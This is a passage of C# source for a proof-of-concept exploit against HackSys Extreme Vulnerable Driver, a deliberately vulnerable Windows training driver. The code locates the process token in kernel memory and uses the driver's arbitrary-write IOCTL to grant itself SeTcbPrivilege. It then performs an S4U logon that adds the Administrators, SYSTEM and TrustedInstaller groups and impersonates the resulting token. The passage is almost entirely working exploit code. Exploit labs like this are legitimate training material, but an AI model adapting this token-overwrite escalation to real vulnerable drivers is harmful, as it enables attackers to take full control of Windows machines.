                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                LOCAL_SYSTEM_RID,
                out IntPtr pLocalSystem))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get local system SID.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            if (!ConvertStringSidToSid(
                TRUSTED_INSTALLER_RID,
                out IntPtr pTrustedInstaller))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get TrustedInstaller SID.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            var tokenGroups = new TOKEN_GROUPS(3);

            tokenGroups.Groups[0].Sid = pAdminGroup;
            tokenGroups.Groups[0].Attributes = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
            tokenGroups.Groups[1].Sid = pLocalSystem;
            tokenGroups.Groups[1].Attributes = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);
            tokenGroups.Groups[2].Sid = pTrustedInstaller;
            tokenGroups.Groups[2].Attributes = (uint)(
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED |
                SE_GROUP_ATTRIBUTES.SE_GROUP_ENABLED_BY_DEFAULT |
                SE_GROUP_ATTRIBUTES.SE_GROUP_MANDATORY);

            var pTokenGroups = Marshal.AllocHGlobal(Marshal.SizeOf(tokenGroups));
            Marshal.StructureToPtr(tokenGroups, pTokenGroups, true);

            var msvS4uLogon = new MSV1_0_S4U_LOGON(username, domain);
            var originName = new LSA_STRING("S4U");
            var pS4uTokenBuffer = Marshal.AllocHGlobal(IntPtr.Size);

            ntstatus = LsaLogonUser(
                hLsa,
                ref originName,
                type,
                authnPkg,
                msvS4uLogon.Pointer(),
                msvS4uLogon.Length(),
                pTokenGroups,
                ref tokenSource,
                out IntPtr profileBuffer,
                out int profileBufferLength,
                out LUID logonId,
                pS4uTokenBuffer,
                out QUOTA_LIMITS quotas,
                out int subStatus);

            msvS4uLogon.Dispose();
            Marshal.FreeHGlobal(pTokenGroups);
            LsaFreeReturnBuffer(profileBuffer);
            LsaClose(hLsa);

            var hS4uToken = Marshal.ReadIntPtr(pS4uTokenBuffer);
            Marshal.FreeHGlobal(pS4uTokenBuffer);

            if (ntstatus != STATUS_SUCCESS)
            {
                error = LsaNtStatusToWinError(ntstatus);
                Console.WriteLine("[-] Failed to S4U logon.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, true));

                return IntPtr.Zero;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            var pIntegrity = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel);

            if (pIntegrity == IntPtr.Zero)
                return IntPtr.Zero;

            var mandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(
                pIntegrity, typeof(TOKEN_MANDATORY_LABEL));
            var lengthSid = GetLengthSid(mandatoryLabel.Label.Sid);

            if (!SetTokenInformation(
                hS4uToken,
                TOKEN_INFORMATION_CLASS.TokenIntegrityLevel,
                pIntegrity,
                Marshal.SizeOf(mandatoryLabel) + lengthSid))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to adjust integrity level for S4U token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                CloseHandle(hS4uToken);
                hS4uToken = IntPtr.Zero;
            }
            else
            {
                Console.WriteLine("[+] S4U logon is successful.");
            }

            return hS4uToken;
        }


        static IntPtr GetCurrentProcessTokenPointer()
        {
            int error;
            int ntstatus;
            var pObject = IntPtr.Zero;

            if (!OpenProcessToken(
                Process.GetCurrentProcess().Handle,
                TokenAccessFlags.MAXIMUM_ALLOWED,
                out IntPtr hToken))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to open current process token.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a handle of current process token.");
            Console.WriteLine("    |-> hToken: 0x{0}", hToken.ToString("X"));
            Console.WriteLine("[>] Trying to retrieve system information.");

            int systemInformationLength = 1024;
            IntPtr infoBuffer;

            do
            {
                infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
                ZeroMemory(infoBuffer, systemInformationLength);

                ntstatus = NtQuerySystemInformation(
                    SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                    infoBuffer,
                    systemInformationLength,
                    ref systemInformationLength);

                if (ntstatus != STATUS_SUCCESS)
                    Marshal.FreeHGlobal(infoBuffer);
            } while (ntstatus == STATUS_INFO_LENGTH_MISMATCH);

            CloseHandle(hToken);

            if (ntstatus != STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to get system information.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(ntstatus, true));

                return IntPtr.Zero;
            }

            var entryCount = Marshal.ReadInt32(infoBuffer);
            Console.WriteLine("[+] Got {0} entries.", entryCount);

            var pid = Process.GetCurrentProcess().Id;
            var entry = new SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX();
            var entrySize = Marshal.SizeOf(entry);
            var pEntryOffset = new IntPtr(infoBuffer.ToInt64() + IntPtr.Size * 2);
            IntPtr uniqueProcessId;
            IntPtr handleValue;

            Console.WriteLine("[>] Searching our process entry (PID = {0}).", pid);

            for (var idx = 0; idx < entryCount; idx++)
            {
                entry = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(
                    pEntryOffset,
                    entry.GetType());
                uniqueProcessId = entry.UniqueProcessId;
                handleValue = entry.HandleValue;

                if (uniqueProcessId == new IntPtr(pid) && handleValue == hToken)
                {
                    pObject = entry.Object;
                    Console.WriteLine("[+] Got our entry.");
                    Console.WriteLine("    |-> Object: 0x{0}", pObject.ToString("X16"));
                    Console.WriteLine("    |-> UniqueProcessId: {0}", uniqueProcessId);
                    Console.WriteLine("    |-> HandleValue: 0x{0}", handleValue.ToString("X"));

                    break;
                }

                pEntryOffset = new IntPtr(pEntryOffset.ToInt64() + entrySize);
            }

            if (pObject == IntPtr.Zero)
                Console.WriteLine("[-] Failed to get target entry.\n");

            Marshal.FreeHGlobal(infoBuffer);
            CloseHandle(hToken);

            return pObject;
        }


        static IntPtr GetDeviceHandle(string deviceName)
        {
            int error;

            Console.WriteLine("[>] Trying to open device driver.");
            Console.WriteLine("    |-> Device Path : {0}", deviceName);

            IntPtr hDevice = CreateFile(
                deviceName,
                FileAccess.ReadWrite,
                FileShare.ReadWrite,
                IntPtr.Zero,
                FileMode.Open,
                FileAttributes.Normal,
                IntPtr.Zero);

            if (hDevice == INVALID_HANDLE_VALUE)
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to get device handle.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return IntPtr.Zero;
            }

            Console.WriteLine("[+] Got a device handle.");
            Console.WriteLine("    |-> hDevice: 0x{0}", hDevice.ToString("X"));

            return hDevice;
        }


        static IntPtr GetInformationFromToken(
            IntPtr hToken,
            TOKEN_INFORMATION_CLASS tokenInfoClass)
        {
            bool status;
            int error;
            int length = 4;
            IntPtr buffer;

            do
            {
                buffer = Marshal.AllocHGlobal(length);
                ZeroMemory(buffer, length);
                status = GetTokenInformation(
                    hToken, tokenInfoClass, buffer, length, out length);
                error = Marshal.GetLastWin32Error();

                if (!status)
                    Marshal.FreeHGlobal(buffer);
            } while (!status && (error == ERROR_INSUFFICIENT_BUFFER || error == ERROR_BAD_LENGTH));

            if (!status)
                return IntPtr.Zero;

            return buffer;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            ProcessModuleCollection modules;
            FormatMessageFlags dwFlags;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            IntPtr pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                modules = Process.GetCurrentProcess().Modules;

                foreach (ProcessModule mod in modules)
                {
                    if (string.Compare(
                        Path.GetFileName(mod.FileName),
                        "ntdll.dll",
                        StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        pNtdll = mod.BaseAddress;
                        break;
                    }
                }

                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE |
                    FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }
            else
            {
                dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
            {
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            }
            else
            {
                return string.Format(
                    "[ERROR] Code 0x{0} : {1}",
                    code.ToString("X8"),
                    message.ToString().Trim());
            }
        }


        static bool ImpersonateThreadToken(IntPtr hImpersonationToken)
        {
            int error;

            Console.WriteLine("[>] Trying to impersonate thread token.");
            Console.WriteLine("    |-> Current Thread ID : {0}", GetCurrentThreadId());

            if (!ImpersonateLoggedOnUser(hImpersonationToken))
            {
                error = Marshal.GetLastWin32Error();
                Console.WriteLine("[-] Failed to impersonation.");
                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));

                return false;
            }

            IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
            IntPtr pImpersonationLevel = GetInformationFromToken(
                hCurrentToken,
                TOKEN_INFORMATION_CLASS.TokenImpersonationLevel);
            var impersonationLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(
                pImpersonationLevel);
            LocalFree(pImpersonationLevel);

            if (impersonationLevel == SECURITY_IMPERSONATION_LEVEL.SecurityIdentification)
            {
                Console.WriteLine("[-] Failed to impersonation.");

                return false;
            }
            else
            {
                Console.WriteLine("[+] Impersonation is successful.");

                return true;
            }
        }


        static void OverwriteTokenPrivileges(
            IntPtr hDevice,
            IntPtr tokenPointer,
            ulong privValue)
        {
            IntPtr pParent = new IntPtr(tokenPointer.ToInt64() + 0x40);
            IntPtr pEnabled = new IntPtr(tokenPointer.ToInt64() + 0x48);

            Console.WriteLine("[>] Trying to overwrite token.");

            WritePointer(hDevice, pParent, new IntPtr((long)privValue));
            WritePointer(hDevice, pEnabled, new IntPtr((long)privValue));
        }


        static void WritePointer(IntPtr hDevice, IntPtr where, IntPtr what)
        {
            uint ioctl = 0x22200B;
            IntPtr inputBuffer = Marshal.AllocHGlobal(IntPtr.Size * 2);
            IntPtr whatBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.Copy(BitConverter.GetBytes(what.ToInt64()), 0, whatBuffer, IntPtr.Size);
            IntPtr[] inputArray = new IntPtr[2];
            inputArray[0] = whatBuffer; // what
            inputArray[1] = where; // where
            Marshal.Copy(inputArray, 0, inputBuffer, 2);

            DeviceIoControl(hDevice, ioctl, inputBuffer, (IntPtr.Size * 2),
                IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);

            Marshal.FreeHGlobal(whatBuffer);
            Marshal.FreeHGlobal(inputBuffer);
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main()
        {
            Console.WriteLine("--[ HEVD Kernel Write PoC : SeTcbPrivilege - S4U Logon\n");

            if (!Environment.Is64BitOperatingSystem)
            {
                Console.WriteLine("[!] 32 bit OS is not supported.\n");

                return;
            }
            else if (IntPtr.Size != 8)
            {
                Console.WriteLine("[!] Should be built with 64 bit pointer.\n");

                return;
            }

            IntPtr tokenPointer = GetCurrentProcessTokenPointer();

            if (tokenPointer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                return;
            }

            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";

            IntPtr hDevice = GetDeviceHandle(deviceName);

            if (hDevice == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open {0}", deviceName);

                return;
            }

            var privs = (ulong)SepTokenPrivilegesFlags.TCB;

            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
            CloseHandle(hDevice);

            IntPtr hS4uToken = GetMsvS4uLogonToken(
                Environment.UserName,
                Environment.UserDomainName,
                SECURITY_LOGON_TYPE.Network);

            if (hS4uToken == IntPtr.Zero)
                return;

            bool status = ImpersonateThreadToken(hS4uToken);
            CloseHandle(hS4uToken);

            if (!status)
                return;

            Console.WriteLine("[+] Exploit is successful. Check this thread token groups.");
            Console.WriteLine("[*] To exit this program, hit [ENTER] key or raise keyboad interrupption.");
            Console.ReadLine();
        }
    }
}